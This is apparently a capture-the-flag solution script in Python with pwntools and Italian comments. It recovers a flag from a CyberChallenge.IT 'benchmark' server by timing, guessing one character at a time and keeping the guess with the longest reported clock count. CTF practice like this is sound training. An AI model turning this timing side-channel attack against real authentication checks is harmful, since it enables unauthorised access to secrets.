#!/usr/bin/env python3

# Importa la libreria di pwntools
from pwn import *

	
	
def main():
	HOST = "benchmark.challs.cyberchallenge.it"
	PORT = 9031
	r = remote(HOST, PORT)
	fine=False
	caratteri=list(string.punctuation)+list(string.digits)+list(string.ascii_letters)
	flag="CCIT{s1d3_ch4nn3ls_r_c00l"
	i=0
	while not fine:
	    	data = r.recvuntil(b"check")
	    	#print(data)
	    	#s="1"*(31-i)

	    	#r.sendlineafter(b":", s.encode())
	    	#data = str(r.recvuntil(b"\n")).split(": ")[1]
	    	#print(data)
	    	max=0
	    	max_car=""
	    	for car in caratteri:
	    		#print(car)
	    		st=flag+car
		    	r.sendlineafter(b":", st.encode())
	    		data_new = str(r.recvuntil(b"clock")).split(" ")[4]
	    		if max<int(data_new):
	    			max=int(data_new)
	    			max_car=car
	    		#print(f"{car} --> {data_new}")
	    		
	    	
	    	flag+=max_car
	    	print("Flag --> ", flag)
	    	if max_car=="}":
	    		break
		
	# chiude la socket
	r.close()


if __name__ == "__main__":
    main()
